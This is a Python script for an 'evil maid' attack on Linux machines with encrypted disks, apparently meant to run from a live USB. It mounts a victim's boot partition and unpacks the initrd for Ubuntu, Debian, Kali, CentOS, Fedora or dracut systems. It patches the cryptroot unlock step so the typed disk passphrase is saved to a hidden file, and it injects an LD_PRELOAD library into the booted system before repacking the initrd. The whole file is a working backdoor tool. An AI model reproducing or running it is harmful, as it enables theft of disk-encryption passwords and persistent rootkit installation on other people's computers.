import os
import sys
import glob
import re
import shutil
import subprocess

if os.getuid():
    sys.exit("Please run as root")

error = lambda x:"\033[0;31m[-] "+x+"\033[0;0m"
info = lambda x:"\033[3;31m[+] "+x+"\033[0;0m"
system = lambda x:subprocess.call(x, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

DEBIANPRELOADCOMMAND = """
cp /{INITRDFILENAME} {ROOT}/{FILENAME}
export LD_PRELOAD=/{FILENAME}
\\1
"""
CENTOSPRELOADCOMMAND = """\\1
ExecStartPre=-/bin/mount -o remount,rw /{ROOT}/
ExecStartPre=-/bin/cp /{INITRDFILENAME} /{ROOT}/{FILENAME}
ExecStartPre=-/bin/sed -i "s@#DefaultEnvironment=@DefaultEnvironment=LD_PRELOAD=/{FILENAME}@" /{ROOT}/etc/systemd/system.conf"""

config = {
        "Ubuntu" : { # 14.04.3
                "IDENTIFIER" : "grep lvm=ubuntu conf/conf.d/cryptroot",

                "PRELOADFILE" : "init",
                "PRELOADPRE" : "(# Chain to real filesystem)",
                "PRELOADPOST" : DEBIANPRELOADCOMMAND,

                "PWFILE" : "scripts/local-top/cryptroot",
                "PWPRE" : "(\\$cryptkeyscript \"\\$cryptkey\" \\|)",
                "PWPOST" : "\\1(read P; echo -ne \\\\\\\\x00$P >> /{INITRDFILENAME}; echo -n $P)| ",

                "ROOT" : "${rootmnt}",
                "FILENAME" : "/dev/hda1",
                "INITRDFILENAME" : "hda1"
            },
        "Debian" : { # 8.2.0
                "IDENTIFIER" : "grep lvm=debian conf/conf.d/cryptroot",

                "PRELOADFILE" : "init",
                "PRELOADPRE" : "(# Chain to real filesystem)",
                "PRELOADPOST" : DEBIANPRELOADCOMMAND,

                "PWFILE" : "scripts/local-top/cryptroot",
                "PWPRE" : "(\\$cryptkeyscript \"\\$cryptkey\" \\|)",
                "PWPOST" : "\\1(read P; echo -ne \\\\\\\\x00$P >> /{INITRDFILENAME}; echo -n $P)| ",

                "ROOT" : "${rootmnt}",
                "FILENAME" : "/dev/hda1",
                "INITRDFILENAME" : "hda1"
            },
        "DRACUT" : { # pseudo OS, causes it to unpack the appended cpio image
                "IDENTIFIER" : "ls kernel/x86/microcode/GenuineIntel.bin"
            },
        "Kali" : { # 2.0
                "IDENTIFIER" : "grep lvm=kali conf/conf.d/cryptroot",

                "PRELOADFILE" : "init",
                "PRELOADPRE" : "(# Chain to real filesystem)",
                "PRELOADPOST" : DEBIANPRELOADCOMMAND,

                "PWFILE" : "scripts/local-top/cryptroot",
                "PWPRE" : "(\\$cryptkeyscript \"\\$cryptkey\" \\|)",
                "PWPOST" : "\\1(read P; echo -ne \\\\\\\\x00$P >> /{INITRDFILENAME}; echo -n $P)| ",

                "ROOT" : "${rootmnt}",
                "FILENAME" : "/dev/hda1",
                "INITRDFILENAME" : "hda1"
            },
        "CentOS" : { # 7
                "IDENTIFIER" : "grep CentOS etc/initrd-release",

                "PRELOADFILE" : "usr/lib/systemd/system/initrd-switch-root.service",
                "PRELOADPRE" : "(\[Service\])",
                "PRELOADPOST" : CENTOSPRELOADCOMMAND,

                "ROOT" : "/sysroot/",
                "FILENAME" : "/usr/lib/lblinux.so.1",
                "INITRDFILENAME" : "hda1"
            },
        "Fedora" : { # 23
                "IDENTIFIER" : "grep Fedora etc/initrd-release",

                "PRELOADFILE" : "usr/lib/systemd/system/initrd-switch-root.service",
                "PRELOADPRE" : "(\[Service\])",
                "PRELOADPOST" : CENTOSPRELOADCOMMAND,

                "ROOT" : "/sysroot/",
                "FILENAME" : "/usr/lib/lblinux.so.1",
                "INITRDFILENAME" : "hda1"
            }
        }
print info("Loading drivers...")
for driver in glob.glob('/usr/local/lib/modules/3.16.6-tinycore/kernel/fs/*/*.ko.gz'):
    system("insmod {} 2>&1 >/dev/null".format(driver))

for disk in glob.glob("/dev/sd?1"):
    print info("Trying {}".format(disk))
    system("mount {} /mnt".format(disk))

    grubcfgpath = False
    for root, dirs, files in os.walk('/mnt'):
        for file in files:
            if file == "grub.cfg":
                grubcfgpath = os.path.join(root,file)
    if not grubcfgpath or not os.path.isfile(grubcfgpath):
        print error("{} does not contain grub.cfg".format(disk))
        system("umount /mnt 2>/dev/null")
        continue

    with open(grubcfgpath, 'r') as grubcfg:
        data = grubcfg.read()
        initrdidx = re.findall('default="([^"]*)"', data)[1]
        if not initrdidx.isdigit():
            print error("Find default failed. Using 0")
            initrdidx = 0
        else:
            initrdidx = int(initrdidx)
        initrd = re.findall("initrd\d*\s+([^\s]+)", data)[initrdidx]
    print info("initrd[{}] = {}".format(initrdidx, initrd))

    print info("Extracting initrd...")
    with open("/mnt{}".format(initrd), "r") as fh:
        compressed = (fh.read(2) == "\x1f\x8b")
    system("{} /mnt{} 2>/dev/null| cpio -i 2>&1 >/dev/null".format("gunzip -c" if compressed else "cat", initrd))

    detectedOS = ""
    for OS in config:
        if not system(config[OS]["IDENTIFIER"]):
            detectedOS = OS
            break

    if not detectedOS:
        print error("OS Detection Failed, Bailing")
        os.system('sh')
        system("umount /mnt 2>/dev/null")

    dracut = (detectedOS == "DRACUT")
    if dracut:
        # unpack
        print info("dracut found, extracting real initrd...")
        system("rm -rf *")

        fh = open("/mnt{}".format(initrd), "r")
        data = fh.read()
        idx = data.index("TRAILER!!!")
        while data[idx:idx+2] != "\x1f\x8b":
            idx += 1
        system("dd if=/mnt{} bs={} skip=1 | gunzip -c | cpio -i 2>&1 >/dev/null".format(initrd, idx))

        print info("Redetecting OS...")
        detectedOS = ""
        for OS in config:
            if not system(config[OS]["IDENTIFIER"]):
                detectedOS = OS
                break

    print info("OS: {}".format(detectedOS))
    print info("Backdooring initrd...")
    if os.path.isfile(config[detectedOS]["INITRDFILENAME"]):
        print error("Already backdoored")
        continue

    shutil.copy('/hda1', config[detectedOS]["INITRDFILENAME"])

    for file in [key for key in config[detectedOS].keys() if key.endswith('FILE')]:
        fname = config[detectedOS][file]
        pre = config[detectedOS][file[:-4] + "PRE"].format(**config[detectedOS])
        post = config[detectedOS][file[:-4] + "POST"].format(**config[detectedOS])
        with open(fname, "r") as fh:
            data = fh.read()
            data = re.sub(pre, post, data)
        with open(fname, "w") as fh:
            fh.write(data)
    os.system('sh')
    print info("Packing initrd...")
    if dracut:
        system("find . | cpio -o -H newc | gzip | dd bs={} seek=1 of=/mnt{}".format(idx, initrd))
    else:
        system("find . | cpio -o -H newc | gzip > /mnt{}".format(initrd))

    system("umount /mnt 2>&1 >/dev/null")
system("poweroff")
